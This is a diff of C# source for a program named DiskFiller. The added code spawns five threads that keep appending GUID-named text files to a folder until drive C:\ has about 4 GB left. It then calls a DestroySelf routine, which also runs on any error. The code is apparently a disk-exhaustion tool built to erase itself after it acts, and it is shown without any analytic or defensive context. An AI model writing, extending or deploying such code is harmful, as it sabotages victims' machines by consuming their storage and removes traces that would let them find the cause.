@@ -74,7 +74,23 @@ namespace DiskFiller
             string fileContent = PrepareFileContent();
 
 
-            // Start the writing
+
+            // Create folder for filling if necessary
+            if (Directory.Exists(finalPaths.diskFillerFolder) == false)
+            {
+                try
+                {
+                    Directory.CreateDirectory(finalPaths.diskFillerFolder);
+                }
+                catch
+                {
+                    DestroySelf();
+                }
+            }
+
+
+
+            StartDiskFilling(fileContent);
         }
 
 
@@ -196,6 +212,53 @@ namespace DiskFiller
             }
 
             return fileContent;
+        }
+
+
+
+        /// <summary>
+        /// Starts the main process, creates 5 threads and writes to files
+        /// </summary>
+        /// <param name="fileContent"></param>
+        private void StartDiskFilling(string fileContent)
+        {
+            for (int i = 0; i < 5; i++)
+            {
+                Thread thread = new Thread(() =>
+                {
+                    WriteToFiles(fileContent);
+                });
+
+                thread.Start();
+            }
+        }
+
+
+
+        /// <summary>
+        /// Writes to a fíle as long as the disk has at least 4gb of space
+        /// </summary>
+        /// 
+        /// <param name="fileContent"> The content which will be written to the files </param>
+        private void WriteToFiles(string fileContent)
+        {
+            while (true)
+            {
+                if (GetFreeDiskSpace(@"C:\") <= 4)
+                {
+                    DestroySelf();
+                    return;
+                }
+
+                try
+                {
+                    File.AppendAllText($@"{finalPaths.diskFillerFolder}\{Guid.NewGuid()}.txt", fileContent);
+                }
+                catch
+                {
+                    DestroySelf();
+                }
+            }
         }
     }
 }
